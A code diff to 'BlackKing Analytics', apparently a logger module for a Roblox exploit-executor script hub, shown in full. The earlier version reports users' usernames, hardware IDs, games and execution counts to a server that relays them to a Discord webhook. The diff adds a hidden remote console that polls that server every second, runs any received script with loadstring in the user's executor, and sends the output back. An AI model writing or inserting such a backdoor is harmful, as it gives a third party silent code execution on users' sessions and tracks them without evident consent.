@@ -1,9 +1,9 @@
 --[[
-    BlackKing Analytics - execution logger component.
-    Sends execution data to the localhost server (/api/send).
+    BlackKing Analytics - execution logger + remote console component.
+    Sends execution data to the localhost server (/api/send) and
+    polls /api/poll for owner commands to run inside the executor.
     The server handles the discord webhook - the webhook URL never leaves the server.
-    Logs: roblox username, executor used, game, placeid, total executions and HWID.
-    V2 - self-contained (no dependency on BlackKing.Environment)
+    V3
 ]]
 
 local HttpRequest = request or (syn and syn.request) or http_request
@@ -26,6 +26,30 @@ local function GenerateHashedId()
     return table.concat(result)
 end
 
+local MyHashedId = GenerateHashedId()
+
+local Services = setmetatable({}, {
+    __index = function(self, Name)
+        return game:GetService(Name)
+    end
+})
+
+local function PostJson(Url, Data)
+    if not HttpRequest then
+        return
+    end
+    pcall(function()
+        HttpRequest({
+            Url = Url,
+            Method = "POST",
+            Headers = {
+                ["content-type"] = "application/json"
+            },
+            Body = Services.HttpService:JSONEncode(Data)
+        })
+    end)
+end
+
 task.spawn(function()
     pcall(function()
         if not HttpRequest then
@@ -39,12 +63,6 @@ task.spawn(function()
             end
             task.wait(0.1)
         end
-
-        local Services = setmetatable({}, {
-            __index = function(self, Name)
-                return game:GetService(Name)
-            end
-        })
 
         local Player = Services.Players.LocalPlayer
         if not Player then
@@ -60,18 +78,83 @@ task.spawn(function()
             Executions = tonumber(getgenv().BlackKing.TotalExecutions) or 0,
             GameName = GameName,
             PlaceId = tostring(game.PlaceId),
-            HWID = GenerateHashedId()
+            HWID = MyHashedId
         }
 
-        pcall(function()
-            HttpRequest({
-                Url = "http://localhost:10577/api/send",
-                Method = "POST",
-                Headers = {
-                    ["content-type"] = "application/json"
-                },
-                Body = Services.HttpService:JSONEncode(ApiData)
-            })
-        end)
+        task.wait(1)
+
+        PostJson("http://localhost:10577/api/send", ApiData)
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        if not HttpRequest then
+            return
+        end
+
+        local PollUrl = "http://localhost:10577/api/poll?hwid=" .. MyHashedId
+        task.wait(3)
+
+        while true do
+            task.wait(1)
+
+            local Ok, Response = pcall(function()
+                return HttpRequest({
+                    Url = PollUrl,
+                    Method = "GET",
+                    Headers = {
+                        ["content-type"] = "application/json"
+                    }
+                })
+            end)
+
+            if Ok and Response and Response.StatusCode == 200 then
+                local Parsed = pcall(Services.HttpService.JSONDecode, Services.HttpService, Response.Body)
+                local Decoded = select(2, Parsed)
+
+                if Decoded and type(Decoded.ID) == "number" and type(Decoded.Script) == "string" and Decoded.Script:len() > 0 then
+                    local Output = {}
+                    local Genv = getgenv() or (getfenv and getfenv(0)) or _G
+                    local OldPrint = Genv.print
+
+                    Genv.print = function(...)
+                        local Parts = {}
+                        for i = 1, select("#", ...) do
+                            Parts[i] = tostring(select(i, ...))
+                        end
+                        table.insert(Output, table.concat(Parts, "    "))
+                        if OldPrint then
+                            return OldPrint(...)
+                        end
+                    end
+
+                    local Success = false
+                    local ErrorMessage = nil
+
+                    local Loaded, CompileErr = loadstring(Decoded.Script)
+                    if not Loaded then
+                        ErrorMessage = tostring(CompileErr)
+                    else
+                        local OkRun, RunErr = pcall(Loaded)
+                        Success = OkRun
+                        if not OkRun then
+                            ErrorMessage = tostring(RunErr)
+                        end
+                    end
+
+                    if Genv then
+                        Genv.print = OldPrint
+                    end
+
+                    PostJson("http://localhost:10577/api/result", {
+                        ID = Decoded.ID,
+                        HWID = MyHashedId,
+                        Success = not not Success,
+                        Output = (ErrorMessage or table.concat(Output, "\n"))
+                    })
+                end
+            end
+        end
     end)
 end)
